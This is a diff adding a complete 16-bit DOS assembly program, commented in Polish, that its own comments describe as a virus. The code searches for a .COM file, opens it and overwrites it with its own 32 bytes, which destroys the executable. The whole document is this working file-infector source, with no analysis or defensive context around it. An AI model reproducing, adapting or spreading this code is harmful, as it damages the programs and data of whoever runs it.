@@ -1,0 +1,29 @@
+start:                                         ; początek wirusa
+
+   MOV AH,4EH                                  ; szukanie pliku
+
+   MOV DX,OFFSET maska ; z rozszerzeniem COM
+
+   INT 21H
+
+   MOV AX,3D02H                     ; otwarcie pliku
+
+   MOV DX,09EH                       ; nazwa znalezionego pliku z bloku DTA
+
+   INT 21H
+
+   XCHG AX,BX                                  ; do BX numer dojścia
+
+   MOV AH,40H                                  ; pisanie w pliku
+
+   MOV CL,20H                                  ; CL=20H --> CL=32 - długość zapisywanego pliku
+
+   MOV DX,OFFSET start     ; począwszy od początku wirusa
+
+   INT 21H
+
+   RET                                                  ; zakończenie programu
+
+   maska DB "*.COM",0              ; szukany plik  
+
+end start
